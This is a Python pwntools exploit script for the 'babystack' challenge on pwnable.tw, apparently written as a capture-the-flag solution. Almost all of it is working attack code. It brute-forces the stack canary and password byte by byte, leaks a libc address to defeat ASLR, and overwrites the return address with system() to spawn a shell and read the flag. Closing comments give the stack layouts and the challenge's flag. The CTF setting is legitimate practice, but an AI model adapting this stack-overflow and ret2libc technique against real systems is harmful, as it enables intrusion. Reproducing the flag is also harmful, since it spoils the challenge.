from pwn import *

DEBUG = len(sys.argv) > 1
libc = ELF("./libc.so.6", checksec=False)

base = 0x555555400000
g_canary_save = 0x00202020
g_auth = 0x00202014 + base
after_vuln_call = 0x00001030
in_loop = 0x00000F58
stack_smash = 0x00001006
before_change_check = 0x00000FF1
after_login = 0x00000FC6
before_strcpy = 0x0000EBB
after_strcpy = 0x00000EC0
before_magic_read = 0x00000EA5

CANARY_LENGTH = 16

if DEBUG:
    p = process("./babystack_patched", aslr=True)
else:
    p = remote("chall.pwnable.tw", 10205)

from enum import Enum


class Menu(Enum):
    Login_Logout = 1
    Exit = 2
    MagicCopy = 3


class App:
    _LOGIN_SUCCESS_PROMPT = b"Login Success !"

    def __init__(self, p: tube):
        self._p = p
        self._logged_in = False

    def _select_menu(self, menu: Menu):
        self._p.sendlineafter(b">> ", str(menu.value).encode())

    def magic_copy(self, payload: bytes):
        self._select_menu(Menu.MagicCopy)
        self._p.sendafter(b"Copy :", payload)

    def login(self, password: bytes) -> bool:
        self._select_menu(Menu.Login_Logout)
        self._p.sendafter(b"Your passowrd :", password)
        self._logged_in = self._LOGIN_SUCCESS_PROMPT in p.recvline()
        return self._logged_in

    def logout(self):
        if not self._logged_in:
            error("Not logged in, can't log out")

        self._select_menu(Menu.Login_Logout)
        self._logged_in = False


def GDB():
    if not DEBUG:
        return

    gdb.attach(
        p,
        f"""b *{hex(base+in_loop)}
    #b *{hex(base+before_magic_read)}
    #b *{hex(base+after_strcpy)}
     """,
    )


def bruteforce_stack_data(
    app: App, count_from_canary: int, base_guess: bytes = b""
) -> bytes:
    prog = log.progress(f"Bruteforcing stack data {count_from_canary=} {base_guess=}")
    result = b""

    for _ in range(count_from_canary):
        for j in range(1, 0xFF + 1):
            if not app.login(base_guess + result + p8(j) + b"\x00"):
                # wrong guess
                continue

            app.logout()
            result += p8(j)
            progress = (len(result) / count_from_canary) * 100
            prog.status(f"{progress:.2f}%")

            if len(result) == count_from_canary:
                prog.success()
                return result
            break
        if j == 0xFF:
            error("Failed, data probably contains null or newlines")
            prog.failure()


def leak_libc_base(app) -> bytes:
    # after our call to login() and magic_copy(),
    # the canary is overwritten to bunch of A's,
    # and the first choice qword is overwritten to 1CCCCCCC.
    setvbuf_plus_324_leak = bruteforce_stack_data(
        app,
        count_from_canary=6,
        base_guess=b"B" * 16 + b"1\nCCCCCC",
    )

    setvbuf_plus_324_leak = setvbuf_plus_324_leak.ljust(8, b"\x00")
    setvbuf_plus_324_leak = u64(setvbuf_plus_324_leak)
    setvbuf = setvbuf_plus_324_leak - 324
    libc_base = setvbuf - libc.sym.setvbuf
    return libc_base


def exploit():
    app = App(p)
    info("Leaking random password...")
    canary = bruteforce_stack_data(app, CANARY_LENGTH)
    info(f"canary[0]: {u64(canary[:CANARY_LENGTH//2]):#x}")
    info(f"canary[1]: {u64(canary[CANARY_LENGTH//2:]):#x}")

    # stage libc leak
    info("Leaking setvbuf+324...")
    payload = flat(
        [
            # byass login + fill magic_buf (64 bytes)
            b"\x00",
            b"A" * 63,
            # overwrite canary
            b"B" * 16,
            # overwrite first qword of choice buffer
            b"C" * 8,
        ]
    )

    if not app.login(payload):
        error("Failed to login with leaked password")

    app.magic_copy(b"A" * 0x3F)
    app.logout()

    libc_base = leak_libc_base(app)
    libc.address = libc_base
    info(f"Calculated libc base: {libc_base:#x}")
    info("trigger system()...")
    payload = flat(
        [
            # byass login + fill magic_buf (64 bytes)
            b"\x00",
            b"A" * 63,
            # reset canary to the leaked one so we will pass the canary check
            canary,
            # overwrite choice
            b"B" * 16,
            # overwrite saved EBP
            p64(0xDEADBEEFDEADBEEF),
            # overwrite return address
            p64(libc.sym["system"]),
        ]
    )

    if not app.login(payload):
        error("Failed to login.")

    app.magic_copy(b"A" * 63)

    # Return from main(). RDI will point to 2;sh\x00.
    p.sendafter(b">> ", b"2;sh\x00")
    p.sendline(b"cat /home/*/flag")
    p.interactive()


exploit()


# login's buffer aligns with magic_copy's local buffer. they are both located at EBP-0x80 which
# is the same address because of the loop in main.

# main stack layout:
# unk buf [64 bytes] ebp - 0x60
# random_password [16 bytes] ebp - 0x20
# choice [16 bytes] ebp - 0x10
# saved EBP <---- ebp point here
# return address

# login stack layout:
# unused [16 bytes]               : EBP - 0x90
# input [128 bytes]               : EBP - 0x80

# magic_copy stack layout:
# unused [16 bytes]               : EBP - 0x90
# input [128 bytes]               : EBP - 0x80
#
# FLAG{Its_juS7_a_st4ck0v3rfl0w}
